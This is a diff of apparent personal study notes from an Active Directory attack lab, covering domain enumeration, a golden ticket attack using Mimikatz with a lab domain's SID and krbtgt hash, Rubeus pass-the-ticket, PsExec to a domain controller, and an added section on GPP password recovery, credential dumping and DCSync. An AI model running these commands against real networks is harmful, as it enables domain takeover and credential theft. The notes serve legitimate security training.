@@ -344,4 +344,7 @@ Primary:WDigest *
   * RID is relative identifier, it's the last four digits we chop off for the SID. You can list all users in a domain by `net user /domain`, list all members of the DA group by `net group "Domain Admins" /domain`, and find detailed info on one user with `net user <username> /domain`. 
 * Golden ticket tasks:
   * Perform golden ticket attack and create a TGT for the **Administrator** account. Once you've created your TGT for the Administrator user and loaded it into memory, use **PsExec** with the following syntax to establish a session on the DC: `PsExec64.exe \\dc01.krbtown.local cmd`.
-  * *Tasks 4 and 5**: Creating golden ticket with `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:Administrator /krbtgt:a299249c93e6091f8667e949a6e08c89`. Assuming ticket with `Rubeus.exe ptt /ticket:ticket.kirbi` and then I used `PsExec64.exe \\dc01.krbtown.local cmd` and then I navigated to the directory. Remember `type` is equivalent of `cat` for Windows. 
+  * *Tasks 4 and 5**: Creating golden ticket with `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:Administrator /krbtgt:a299249c93e6091f8667e949a6e08c89`. Assuming ticket with `Rubeus.exe ptt /ticket:ticket.kirbi` and then I used `PsExec64.exe \\dc01.krbtown.local cmd` and then I navigated to the directory. Remember `type` is equivalent of `cat` for Windows.
+ 
+##### LAB: Active Directory Domain Passwords
+* You'll need to use Get-GPPPassword to find the plaintext password of a local administrator in GPP. Next, you'll need to use Mimikatz to dump a logged-in Domain Admin's credentials, before using the dumped Domain Admin's credentials to run a DCSync attack against the **ORCHID/krbtgt** account. 
